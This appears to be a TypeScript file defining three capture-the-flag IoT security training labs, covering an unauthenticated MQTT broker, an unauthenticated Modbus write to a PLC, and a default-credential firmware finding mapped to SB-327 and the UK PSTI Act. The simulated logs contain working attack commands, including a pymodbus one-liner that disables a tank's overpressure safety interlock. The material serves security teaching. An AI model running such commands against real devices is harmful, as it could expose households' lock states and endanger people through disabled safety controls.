import { dir, file } from '../vfs';
import type { LabScenario } from '../types';

function reviewer(files: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'iot-review-ws-2', user: 'root', root: dir({ root: dir(files) }) };
}

/** IoT & Embedded Security lab pack #2 — three labs pairing with the module's new lessons 6-8 (Zigbee/Z-Wave/
 *  MQTT protocols, ICS/SCADA security, and closing testing methodology/compliance). All three are file-review
 *  scenarios — no live Zigbee/Modbus/MQTT protocol simulation exists in this engine, matching the honest
 *  convention already used for this module's UART and JTAG labs. */
export const iotLabs2: LabScenario[] = [
  // 1 — an unauthenticated MQTT broker exposes an entire device fleet (Lesson 6)
  {
    id: 'iot-mqtt-broker-unauthenticated-fleet-exposure',
    title: 'IoT: An Unauthenticated MQTT Broker Exposes an Entire Smart-Home Fleet',
    difficulty: 'Easy',
    category: 'IoT',
    briefing:
      'brightnest-hub\'s MQTT broker (port 1883) was found reachable directly on the public internet during a ' +
      'Shodan-based recon pass. Review the captured wildcard-subscription session to confirm exactly how much ' +
      'of the customer fleet\'s live data is exposed with zero authentication.',
    objectives: [
      { text: 'cat mqtt-wildcard-subscribe-session.log', why: 'The "#" wildcard subscribes to every topic on the broker at once — on a broker with no authentication and no topic-level ACLs configured, this single command from the lesson dumps live telemetry across the ENTIRE customer fleet, not just one device.' },
    ],
    hints: [
      'cat mqtt-wildcard-subscribe-session.log',
    ],
    totalFlags: 1,
    attacker: reviewer({
      'mqtt-wildcard-subscribe-session.log': file(
        '$ nmap -p 1883 203.0.113.44\n' +
          'PORT     STATE SERVICE\n' +
          '1883/tcp open  mqtt\n' +
          '$ mosquitto_sub -h 203.0.113.44 -p 1883 -t "#" -v\n' +
          'home/48821/lock/frontdoor/state UNLOCKED\n' +
          'home/48821/camera/backyard/motion true\n' +
          'home/91204/thermostat/livingroom/temp 71.2\n' +
          'home/91204/lock/frontdoor/state LOCKED\n' +
          'home/55310/lock/garage/state UNLOCKED\n' +
          '... (thousands more lines -- live telemetry for every customer on this broker) ...\n' +
          '-- no username/password prompt was ever presented -- one command exposed live lock\n' +
          '   states, camera motion events, and thermostat readings across the entire customer fleet --\n' +
          'flag{unauthenticated_mqtt_broker_wildcard_subscribe_exposes_full_fleet}\n',
      ),
    }),
    network: [],
  },

  // 2 — an unauthenticated Modbus write flips a safety interlock (Lesson 7)
  {
    id: 'iot-modbus-unauthenticated-safety-interlock-write',
    title: 'IoT: An Unauthenticated Modbus Write Disables a Safety Interlock',
    difficulty: 'Hard',
    category: 'IoT',
    briefing:
      'During an authorized OT security assessment, a PLC controlling a chemical mixing tank was found ' +
      'reachable via Modbus TCP with no authentication. Review the captured session log confirming what a ' +
      'single unauthenticated register write could do to a physical safety control.',
    objectives: [
      { text: 'cat modbus-session-log.txt', why: 'Modbus has no authentication, encryption, or integrity checking built in at all (Lesson 7) — any device that can reach port 502 can read or write any register the PLC exposes, with the PLC trusting every command as genuine.' },
      { text: 'Identify what register 40012 actually controls, and why writing to it is dangerous', why: 'This is the actual stakes-defining question from the lesson: OT findings carry physical consequences a pure IT finding never does — this register directly gates a safety interlock preventing tank overpressure.' },
    ],
    hints: [
      'cat modbus-session-log.txt',
    ],
    totalFlags: 1,
    attacker: reviewer({
      'modbus-session-log.txt': file(
        '$ nmap -p 502 10.40.0.15\n' +
          'PORT    STATE SERVICE\n' +
          '502/tcp open  modbus\n' +
          '$ python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient(\'10.40.0.15\');' +
          ' c.connect(); print(c.read_holding_registers(40012, 1))"\n' +
          'HoldingRegisters(1) = [1]   # register 40012: SAFETY_INTERLOCK_ENABLED = 1 (TRUE)\n' +
          '$ python3 -c "from pymodbus.client import ModbusTcpClient; c=ModbusTcpClient(\'10.40.0.15\');' +
          ' c.connect(); c.write_register(40012, 0)"\n' +
          '-- write ACCEPTED, no authentication of any kind was required --\n' +
          '-- register 40012 gates the tank\'s overpressure safety interlock -- writing 0 disables it --\n' +
          '-- (this write was reverted immediately in the authorized test window; documented, not left --\n' +
          '    in place) --\n' +
          'flag{unauthenticated_modbus_write_disables_physical_safety_interlock}\n',
      ),
    }),
    network: [],
  },

  // 3 — FSTM firmware-emulation finding mapped to a specific compliance violation (Lesson 8, capstone)
  {
    id: 'iot-fstm-emulation-finding-compliance-mapping',
    title: 'IoT: A QEMU-Emulated Firmware Finding Mapped to a Compliance Violation',
    difficulty: 'Medium',
    category: 'IoT',
    briefing:
      'skyviewcam-fw-v3.2.1 (from earlier in this module) was booted under QEMU emulation per the OWASP FSTM ' +
      'stage-6 methodology, enabling dynamic testing without the physical device. Review the resulting finding ' +
      'and map it to the specific regulatory obligation it violates.',
    objectives: [
      { text: 'cat qemu-emulation-dynamic-test.log', why: 'Stage 6 of the FSTM (emulation) is what makes dynamic testing of Lesson 4\'s web-UI vulnerabilities possible without the physical hardware — confirming the finding reproduces identically under emulation.' },
      { text: 'cat regulatory-mapping-worksheet.txt', why: 'Turning a technical finding into a named legal obligation (Lesson 8\'s compliance-mapping discipline) makes the business impact concrete for stakeholders who might not otherwise prioritize a "default password" finding as urgently as a specific named regulatory violation.' },
    ],
    hints: [
      'cat qemu-emulation-dynamic-test.log',
      'cat regulatory-mapping-worksheet.txt',
    ],
    totalFlags: 1,
    attacker: reviewer({
      'qemu-emulation-dynamic-test.log': file(
        '$ qemu-system-arm -M versatilepb -kernel extracted-zImage -drive file=extracted-rootfs.img\n' +
          '[boot] emulated firmware reached login prompt\n' +
          '$ curl http://localhost:8080/login -d "user=admin&pass=admin"\n' +
          '{"status":"authenticated","session":"a19f..."}\n' +
          '-- default credential admin/admin, still active, confirmed under full dynamic emulation,\n' +
          '   with no forced password change on first use anywhere in the login flow --\n',
      ),
      'regulatory-mapping-worksheet.txt': file(
        'Finding: default admin/admin credential, no forced change on first use\n' +
          '  -> California SB-327: DIRECT violation -- explicitly requires either a unique\n' +
          '     preprogrammed password per device, or a forced change on first use. This device\n' +
          '     has neither.\n' +
          '  -> UK PSTI Act: DIRECT violation -- outright bans universal default passwords for\n' +
          '     consumer connectable products.\n' +
          'flag{qemu_emulated_default_credential_finding_mapped_to_sb327_violation}\n',
      ),
    }),
    network: [],
  },
];
